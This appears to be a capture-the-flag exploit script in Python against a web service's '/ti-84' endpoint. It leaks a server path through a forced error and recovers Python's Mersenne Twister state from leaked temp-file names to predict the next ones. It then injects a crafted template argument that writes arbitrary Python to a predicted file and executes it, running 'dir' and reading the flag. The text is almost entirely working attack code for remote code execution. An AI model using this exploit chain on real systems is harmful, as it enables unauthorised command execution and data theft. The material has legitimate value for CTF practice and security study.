import requests
import sys
import random
from math import floor
from gf2bv import LinearSystem
from gf2bv.crypto.mt import MT19937


def extract(x, high=False):
    x = int(x * (1<<53))
    if high:
        x -= 1
    a_ = x >> 26
    b_ = x & ((1<<26)-1)
    return a_, b_

cset = "abcdefghijklmnopqrstuvwxyz0123456789_"
def get_similar_prefix(bs):
    for i in range(len(bs[0])):
        if not all(b[i] == bs[0][i] for b in bs):
            return bs[0][:i]
    return bs[0]

def sim_random():
    a = random.getrandbits(32)>>5
    b = random.getrandbits(32)>>6
    x = (a*67108864.0+b)*(1.0/9007199254740992.0)
    c = cset[floor(x*len(cset))]
    return c, bin(a)[2:].zfill(27)


vals = {}
for i in range(1_000_000):
    c, b = sim_random()
    if c not in vals:
        vals[c] = []
    vals[c].append(b)

table = {k: get_similar_prefix(v) for k, v in vals.items()}

def break_mt19937(out):
    lin = LinearSystem([32] * 624)
    mt = lin.gens()
    rng = MT19937(mt)
    zeros = []
    for o in out:
        if o:
            zeros.append((rng.getrandbits(32)>>(32-len(o))) ^ int(o,2))
        else:
            rng.getrandbits(32)
        rng.getrandbits(32)
    sol = lin.solve_one(zeros)
    rng = MT19937(sol)
    pyrand = rng.to_python_random()
    return pyrand

def get_random(r):
    return "".join(r.choices(cset, k=8))


def break_rng(out):
    out = [table[b] for b in out]
    return break_mt19937(out)

target = sys.argv[1]
target = target.replace("http://", "").replace("https://", "")
target = "http://" + target
def get_fpath():
    r = requests.get(f"{target}/ti-84", params={"code": "1/0", "tmpl": "??"})
    return r.text.split(' File "')[1].split('.py')[0] + ".py"


base_path = get_fpath()[::-1].split("\\", 1)[-1][::-1]
print(f"path = {base_path}")
out = ""
total_bits = 0
while total_bits < 624*32:
    out += get_fpath().split(".py")[0][-8:]
    total_bits += sum(len(table[b]) for b in out[-8:])
    print(f"{total_bits}/{624*32} bits", end="\r")

print()

r2 = break_rng(out)
for _ in range(len(out)*2):
    r2.getrandbits(32)

def run_command(cmd):
    target_path = f"{base_path}\\tmp{''.join(r2.choices(cset, k=8))}.py"
    tmpl = f"??.tmpl＂ -w'%output{{>>{target_path}}}{cmd};#'"
    r = requests.get(f"{target}/ti-84", params={"code": "1+1", "tmpl": tmpl})
    return r.text.split('<div class="output">2')[1].split("</div>")[0].strip()

flag_path = run_command("print(__import__('os').popen('dir').read())").split("flag")[1].split(".txt")[0].strip()
flag_path = "flag" + flag_path + ".txt"
print("Flag path:", flag_path)

flag = run_command(f"print(open('{flag_path}').read())")
print("Flag:", flag.strip())

